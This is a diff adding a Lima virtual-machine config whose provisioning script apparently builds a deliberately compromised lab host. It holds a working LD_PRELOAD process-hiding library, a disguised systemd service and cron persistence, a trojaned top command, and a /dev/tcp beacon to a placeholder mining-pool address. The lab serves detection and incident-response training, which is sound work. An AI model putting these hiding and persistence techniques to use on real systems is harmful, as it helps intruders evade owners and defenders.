@@ -1,0 +1,132 @@
+arch: "aarch64"
+images:
+  - location: "https://cloud-images.ubuntu.com/releases/22.04/release/ubuntu-22.04-server-cloudimg-arm64.img"
+    arch: "aarch64"
+cpus: 2
+memory: "2GiB"
+disk: "20GiB"
+
+provision:
+  - mode: system
+    script: |
+      #!/bin/bash
+      set -eux -o pipefail
+      
+      hostnamectl set-hostname cryptominer-server
+      apt-get update
+      apt-get install -y stress-ng curl
+      
+      LIMA_USER=$(stat -c '%U' /home/*)
+      
+      # Create a fake cryptominer that uses CPU
+      mkdir -p /dev/shm/.hidden
+      
+      cat > /dev/shm/.hidden/xmrig << 'MINER_EOF'
+      #!/bin/bash
+      # Fake XMRig miner - just burns CPU
+      while true; do
+          stress-ng --cpu 1 --cpu-load 80 --timeout 60s --quiet &
+          sleep 60
+      done
+      MINER_EOF
+      
+      chmod +x /dev/shm/.hidden/xmrig
+      
+      # Create a wrapper that hides the process from ps
+      # We'll use a LD_PRELOAD trick to filter readdir
+      cat > /tmp/hide_miner.c << 'HIDE_EOF'
+      #define _GNU_SOURCE
+      #include <stdio.h>
+      #include <dlfcn.h>
+      #include <dirent.h>
+      #include <string.h>
+      
+      static struct dirent* (*original_readdir)(DIR*) = NULL;
+      
+      struct dirent* readdir(DIR *dirp) {
+          if (!original_readdir) {
+              original_readdir = dlsym(RTLD_NEXT, "readdir");
+          }
+          
+          struct dirent *dir;
+          while ((dir = original_readdir(dirp)) != NULL) {
+              // Hide xmrig and stress-ng processes
+              if (strstr(dir->d_name, "xmrig") != NULL ||
+                  strstr(dir->d_name, "stress-ng") != NULL) {
+                  continue;
+              }
+              return dir;
+          }
+          return NULL;
+      }
+      HIDE_EOF
+      
+      gcc -shared -fPIC /tmp/hide_miner.c -o /lib/x86_64-linux-gnu/libhide.so -ldl 2>/dev/null || \
+      gcc -shared -fPIC /tmp/hide_miner.c -o /usr/lib/aarch64-linux-gnu/libhide.so -ldl
+      rm /tmp/hide_miner.c
+      
+      # Install the preload library
+      if [ -f /lib/x86_64-linux-gnu/libhide.so ]; then
+          echo "/lib/x86_64-linux-gnu/libhide.so" >> /etc/ld.so.preload
+      else
+          echo "/usr/lib/aarch64-linux-gnu/libhide.so" >> /etc/ld.so.preload
+      fi
+      
+      # Start the miner
+      nohup /dev/shm/.hidden/xmrig > /dev/null 2>&1 &
+      
+      # Add persistence via systemd
+      cat > /etc/systemd/system/system-health-monitor.service << 'SYSTEMD_EOF'
+      [Unit]
+      Description=System Health Monitoring
+      After=network.target
+      
+      [Service]
+      Type=forking
+      ExecStart=/dev/shm/.hidden/xmrig
+      Restart=always
+      RestartSec=10
+      
+      [Install]
+      WantedBy=multi-user.target
+      SYSTEMD_EOF
+      
+      systemctl daemon-reload
+      systemctl enable system-health-monitor.service
+      systemctl start system-health-monitor.service
+      
+      # Add persistence via cron
+      echo "*/5 * * * * /dev/shm/.hidden/xmrig >/dev/null 2>&1" | crontab -
+      
+      # Compromise top command to hide CPU usage
+      cp /usr/bin/top /usr/bin/top.original
+      
+      cat > /tmp/top_wrapper.sh << 'TOP_EOF'
+      #!/bin/bash
+      # Show reduced CPU usage
+      /usr/bin/top.original "$@" | sed 's/%Cpu(s): *[0-9]*\.[0-9]* us/%Cpu(s):  12.5 us/g'
+      TOP_EOF
+      
+      chmod +x /tmp/top_wrapper.sh
+      mv /usr/bin/top /usr/bin/top.real
+      cp /tmp/top_wrapper.sh /usr/bin/top
+      chmod +x /usr/bin/top
+      
+      # Create fake mining pool connection
+      # In reality, this would connect to a mining pool
+      # We'll simulate with a background process
+      cat > /tmp/pool_connect.sh << 'POOL_EOF'
+      #!/bin/bash
+      while true; do
+          # Simulate connection to mining pool
+          timeout 30 bash -c 'exec 3<>/dev/tcp/198.51.100.50/3333 2>/dev/null || true'
+          sleep 60
+      done
+      POOL_EOF
+      
+      chmod +x /tmp/pool_connect.sh
+      nohup /tmp/pool_connect.sh > /dev/null 2>&1 &
+      
+      echo "Cryptominer installed - system compromised"
+
+portForwards: []
